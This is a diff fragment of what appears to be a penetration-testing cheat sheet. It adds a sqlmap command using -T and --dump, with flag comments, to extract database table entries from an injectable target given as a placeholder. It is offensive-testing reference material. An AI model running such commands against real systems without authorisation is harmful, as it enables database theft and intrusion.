@@ -563,6 +563,11 @@ python3 sqlmap.py -u "<TARGET_URL>" --cookie="<COOKIE/SESSION_ID_1>; <COOKIE/SES
 python3 sqlmap.py -u "<TARGET_URL>" --cookie="<COOKIE/SESSION_ID_1>; <COOKIE/SESSION_ID_N" --data="<REQUEST_DATA>" -p <PARAM> --dbs -D <SPECIFIC_KNOWN_DB> --tables --batch --threads <NUMBER_OF_THREADS>
 
 --threads			# concurrent threads to run to increase speed
+
+python3 sqlmap.py -u "<TARGET_URL>" --cookie="<COOKIE/SESSION_ID_1>; <COOKIE/SESSION_ID_N" --data="<REQUEST_DATA>" -p <PARAM> -T <TARGET_VALUE> --tables --batch --threads 5 --dump
+
+-T				# DBMS database table(s) to enumerate
+--dump 				# Dump DBMS database table entries
 ```
 
 ### Dealing with hashes
